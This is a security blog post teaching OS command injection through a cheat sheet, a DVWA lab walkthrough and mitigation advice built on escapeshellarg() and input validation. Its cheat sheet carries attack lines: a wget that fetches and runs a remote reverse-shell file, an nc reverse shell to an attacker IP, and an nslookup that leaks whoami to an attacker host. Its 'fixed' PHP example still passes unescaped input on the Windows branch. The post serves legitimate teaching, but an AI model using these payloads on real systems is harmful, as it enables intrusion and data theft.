<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Exploring OS Command Injection: Understanding and Hands-On Practice - Offens!ve Blogs - Sakibul Ali Khan</title><meta name="description" content="Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-black.css"><link rel="canonical" href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="Exploring OS Command Injection: Understanding and Hands-On Practice"><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png"><meta property="og:image:width" content="1710"><meta property="og:image:height" content="900"><meta property="og:site_name" content="Offens!ve Blogs - Sakibul Ali Khan"><meta property="og:description" content="Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;"><meta property="og:url" content="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="Exploring OS Command Injection: Understanding and Hands-On Practice"><meta name="twitter:description" content="Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/pen-tux.png" type="image/png"><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/jetbrainsmono/jetbrainsmono.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=1909aa20e277be92c34e45175f6bad83"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html"},"headline":"Exploring OS Command Injection: Understanding and Hands-On Practice","datePublished":"2024-02-12T05:12","dateModified":"2024-02-12T05:16","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png","height":900,"width":1710},"description":"Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script type="text/javascript">(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "kza4v42pst");</script></head><body><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><script defer="defer" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "22757d4facf2459dbb19685ef5c4bae1"}'></script><script src="https://mpeztrack.com/v1.0.0/eztrack.min.js" type="text/javascript"></script><script>mpEZTrack.init("3799246d338f6a319e081a697ab7eca4");</script><header class="header"><div class="header__logo"><a class="logo" href="https://sakibulalikhan.pages.dev/"><img src="https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png" alt="Offens!ve Blogs - Sakibul Ali Khan" width="500" height="500"></a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" target="_self">CTF Writeups</a></li><li><a href="https://sakibulalikhan.pages.dev/about.html" target="_self">About</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" target="_self">Contact</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">Exploring OS Command Injection: Understanding and Hands-On Practice</h1><div class="post__meta"><time datetime="2024-02-12T05:12" class="post__date">Feb 12, 2024 </time><span class="post__author"><a href="https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/" class="feed__author">Sakibul Ali Khan</a></span></div><div class="post__tags"><a href="https://sakibulalikhan.pages.dev/tags/command-injection/" class="invert">Command Injection</a> <a href="https://sakibulalikhan.pages.dev/tags/owasp-10/" class="invert">OWASP 10</a> <a href="https://sakibulalikhan.pages.dev/tags/pentesting/" class="invert">Pentesting</a> <a href="https://sakibulalikhan.pages.dev/tags/web-security/" class="invert">Web Security</a></div></header><figure class="post__image post__cover"><img src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice-lg.png 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="900" width="1710" alt="Exploring OS Command Injection: Understanding and Hands-On Practice"></figure><div class="post__entry"><div class="cl-preview-section"><p>Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll delve into the intricacies of OS Command Injection, providing both theoretical insights and practical demonstrations to equip pentesters and bug hunters with the knowledge and skills needed to identify and mitigate this vulnerability effectively. Let’s dive in!</p></div><div class="cl-preview-section"><h2 id="part-1-understanding-os-command-injection">Part 1: Understanding OS Command Injection</h2></div><div class="cl-preview-section"><h3 id="what-is-os-command-injection"><figure class="post__image"><img loading="lazy" style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal); outline: 3px solid rgba(var(--color-primary-rgb), 0.55) !important;" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="597" height="313" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-lg.png 1024w"></figure></h3><h3>What is OS Command Injection?</h3></div><div class="cl-preview-section"><p>OS Command Injection is a type of vulnerability where attackers can execute arbitrary commands on the underlying operating system by manipulating user-supplied input that is passed to system shell commands. This vulnerability arises when web applications incorporate user input directly into command strings without proper validation or sanitization.</p></div><div class="cl-preview-section"><h3 id="impact-of-os-command-injection">Impact of OS Command Injection</h3></div><div class="cl-preview-section"><p>The consequences of OS Command Injection can be severe, potentially leading to unauthorized access, data exfiltration, or even full control over the target system. Attackers can leverage this vulnerability to execute commands with the privileges of the vulnerable application, posing significant risks to the security and integrity of the system.</p></div><div class="cl-preview-section"><h3 id="distinguishing-os-command-injection-from-other-injection-attacks">Distinguishing OS Command Injection from Other Injection Attacks</h3></div><div class="cl-preview-section"><p>It’s essential to differentiate OS Command Injection from other injection attacks, such as Code Injection. While Code Injection involves injecting and executing arbitrary code within the application context, OS Command Injection focuses on manipulating system commands executed by the underlying operating system.</p></div><div class="cl-preview-section"><h3 id="real-world-examples">Real-World Examples</h3></div><div class="cl-preview-section"><p>We explore real-world instances of OS Command Injection vulnerabilities, including notable cases like CVE-2021-25296 in NagiosXI and CVE-2023-29084 in ManageEngine ADManagerPlus. These examples underscore the critical importance of identifying and addressing OS Command Injection vulnerabilities to mitigate security risks.</p></div><div class="cl-preview-section"><h3 id="preventive-measures">Preventive Measures</h3><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="525" height="246" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-lg.png 1024w"></figure></div><div class="cl-preview-section"><p>Effective prevention of OS Command Injection involves implementing robust input validation, avoiding direct invocation of system shell commands whenever possible, and utilizing safe APIs for handling user input. We discuss various preventive strategies and highlight the importance of proactive security measures in mitigating this vulnerability.</p></div><div class="cl-preview-section"><h3 id="command-injection-cheatsheet">Command Injection Cheatsheet</h3></div><div class="cl-preview-section"><pre class="language-bash line-numbers"><code>--------------------------------------------------------------------
Special Characters
&amp;
;
Newline (0x0a or \n)
&amp;&amp;
|
||
command `
$(command )
--------------------------------------------------------------------
Useful Commands: Linux
whoami
ifconfig
ls
uname -a
--------------------------------------------------------------------
Useful Commands: Windows
whoami
ipconfig
dir
ver
--------------------------------------------------------------------
Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id 
ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id 
ls %0A id
--------------------------------------------------------------------
Time Delay Commands
&amp; ping -c 10 127.0.0.1 &amp;
--------------------------------------------------------------------
Redirecting output
&amp; whoami &gt; /var/www/images/output.txt &amp;
--------------------------------------------------------------------
OOB (Out Of Band) Exploitation
&amp; nslookup attacker-server.com &amp;
&amp; nslookup `whoami`.attacker-server.com &amp;
-------------------------------------------------------------------
WAF bypasses
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
/tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
--------------------------------------------------------------------</code></pre></div><div class="cl-preview-section"><div class="cl-preview-section"><h2 id="part-2-hands-on-practical-demonstration">Part 2: Hands-On Practical Demonstration</h2></div><div class="cl-preview-section"><p>In this section, we do a hands-on lab solutions to demonstrate OS Command Injection techniques and detection methods. Pentesters and bug hunters can gain valuable insights into identifying and exploiting OS Command Injection vulnerabilities using practical scenarios.</p><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="616" height="589" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-lg.png 1024w"></figure><p>In this blog post, we'll explore Command Injection Vulnerabilities using DVWA version 1.10 as our playground. I've structured our exploration into two distinct phases: Attack and Securing The Code. You might wonder why I've started with the attack phase first. Well, since we have access to the source code from the beginning (assuming this is white-box testing), it makes sense to dive straight into demonstrating the attack. Later, we'll dissect the source code to understand its workings and discuss preventive measures. Let's begin by exploring the attack phase.</p><h2 id="attack-phase">1. Attack Phase:</h2><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="616" height="591" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-lg.png 1024w"></figure><p>In the Command Injection tab, the system prompts the user for input and specifically requests an IP address to be entered into the designated form field. This input mechanism serves as the entry point for potential exploitation through Command Injection.</p><h3 id="e04b" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: Low</h3><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="385" height="319" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-lg.png 1024w"></figure><p>From the provided source code snippet, it's evident that the system lacks proper input validation. This means users can input any arbitrary integer or character instead of an actual IP Address. This oversight opens up the system to exploitation, as attackers can utilize various operators, also known as meta-characters, to deceive the shell into executing arbitrary commands.</p><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="939" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice4-2-lg.png 1024w"></figure><p>Once the shell executes <code>1.1.1.1;</code>, it proceeds to execute <code>pwd</code> as if it were part of the same shell command. This behavior occurs because the shell interprets the entire input string as a single command.</p><h3 id="8d7c" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: Medium</h3><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="539" height="422" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-lg.png 1024w"></figure><p>In the provided source code snippet, you can input a random integer or any character instead of the expected IP Address. Unfortunately, the system fails to validate user input, allowing anything to be entered. Additionally, the system substitutes the characters <code>&amp;&amp;</code> and <code>;</code>, replacing them with blanks in the array through a substitution function. However, you can still employ other operators, known as meta-characters, to deceive the shell into executing arbitrary commands.</p><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="942" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice6-2-lg.png 1024w"></figure><p>Once the shell executes <code>1.1.1.1 &amp;&amp;</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 &amp;&amp;</code> as part of a single command. Consequently, the shell believes there is another command pending execution, and <code>pwd</code> is executed accordingly.</p><h3 id="e69d" class="pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj">Command Injection: High</h3><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="546" height="519" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-lg.png 1024w"></figure><p>In the provided source code, you can input a random integer or any character instead of the expected IP Address because the system lacks proper validation of user input. Consequently, users can input anything. Additionally, the admin has implemented a trim function to remove any extra spaces in the first array [0] and the last array[∞].</p><p>Moreover, the system substitutes several characters, triggering a substitutions function that replaces the character with a blank in the array when inputted. However, users can only use two operators, also known as meta-characters, to manipulate the shell into executing arbitrary commands. Specifically, users can utilize <code>|</code> without any space afterward, as the system will replace <code>|</code> if extra space is used. Similarly, users can employ <code>||</code>  for this purpose.</p><p><strong>But how does it work when the operator is supposedly filtered?</strong></p><p>When you input <code>1.1.1.1 | pwd</code>, the additional <code>|</code> is replaced with a blank in the array. Consequently, the final payload appears as <code>1.1.1.1 | pwd</code>.</p><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="983" height="941" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice8-2-lg.png 1024w"></figure><p>After the shell executes <code>1 |</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 |</code> as part of a single command. Therefore, the shell believes there is another command pending execution, leading to the execution of <code>pwd</code>.</p><h3 id="c63b" class="ny nz gr be oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bj">2. Securing The Code</h3><p>To enhance the security of this Command Injection Code, there are two crucial steps you can take:</p><ol><li><strong>Escaping Shell Arguments</strong></li></ol><p>In each level of source code complexity, the <code>shell_exec()</code> PHP function is utilized without incorporating the <code>escapeshellarg()</code> function. This practice should be rectified to bolster security measures.</p><figure class="post__image"><img loading="lazy" src="https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9.png" alt="Exploring OS Command Injection: Understanding and Hands-On Practice" width="720" height="388" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-lg.png 1024w"></figure><p>By implementing <code>escapeshellarg()</code>, every meta-character within a string is automatically escaped, and the string itself is encapsulated within quotes. This ensures that the string can be safely passed directly to the shell, where it will be treated as a single, secure argument.</p><pre class="language-php line-numbers"><code>&lt;?php

// Bat Input
if(isset($_POST['Submit'])) {
    $target = $_REQUEST['ip'];

    // Determine DS and execute the ping commend.
    if(stristr(php_uname('s'), 'Windows NT')){
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));
    }

    // Feedback for the end user
    $html .= "&lt;pre&gt; {$cmd}&lt;/pre&gt;";

}

?&gt;</code></pre><p>Now, even the Lowest Difficulty level is fortified against vulnerabilities. It's worth noting that by incorporating <code>escapeshellarg()</code>, the Low, Medium, and High Difficulty levels can achieve heightened security without the need for additional validation. For instance, even if the user inputs something other than an IP Address format, such as "test", the system remains secure.</p><p><span class="nc gs">2.</span><strong class="nc gs"> Validate user input</strong> </p><p>Upon reviewing each source code difficulty, it becomes apparent that the primary objective is to ping a designated IP Address. However, in the Low, Medium, and High Difficulty levels, the failure to validate user input permits users to input arbitrary values, such as characters, instead of adhering to the expected IP Address format. Consequently, it becomes imperative to implement user input validation.</p><p>When user input validation is enforced, any attempt to input values other than the expected IP Address format will be rejected by the system, triggering an error message such as "You have entered an invalid IP." This approach ensures that all input is rigorously validated, thereby sanitizing any potentially malicious input.</p></div><div class="cl-preview-section"><h2 id="conclusion">Conclusion</h2></div><div class="cl-preview-section"><p>OS Command Injection poses significant security risks to web applications, making it imperative for security professionals to understand, detect, and mitigate this vulnerability effectively. By combining theoretical understanding with hands-on practical demonstrations, pentesters and bug hunters can enhance their skills in identifying and addressing OS Command Injection vulnerabilities, ultimately strengthening the overall security posture of web applications.</p></div><h3 id="references-and-further-reading">References and Further Reading:</h3></div><div class="cl-preview-section"><ul><li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77 Command Injection</a></li><li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78 OS Command Injection</a></li><li><a href="https://owasp.org/www-community/attacks/Command_Injection">OWASP Command Injection</a></li><li><a href="https://portswigger.net/web-security/os-command-injection">Portswigger Web Security Academy Materials &amp; Labs</a></li></ul><p> </p></div></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Feb 12, 2024</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html&amp;via=sakibulalikhan&amp;text=Exploring%20OS%20Command%20Injection%3A%20Understanding%20and%20Hands-On%20Practice" class="js-share invert twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F23%2FExploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png&amp;description=Exploring%20OS%20Command%20Injection%3A%20Understanding%20and%20Hands-On%20Practice" class="js-share invert pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html" class="js-share invert mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Exploring%20OS%20Command%20Injection%3A%20Understanding%20and%20Hands-On%20Practice&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Exploring%20OS%20Command%20Injection%3A%20Understanding%20and%20Hands-On%20Practice https%3A%2F%2Fsakibulalikhan.pages.dev%2Fexploring-os-command-injection-understanding-and-hands-on-practice.html" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide "><span class="btn__icon">←</span> <span class="btn__text">Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A 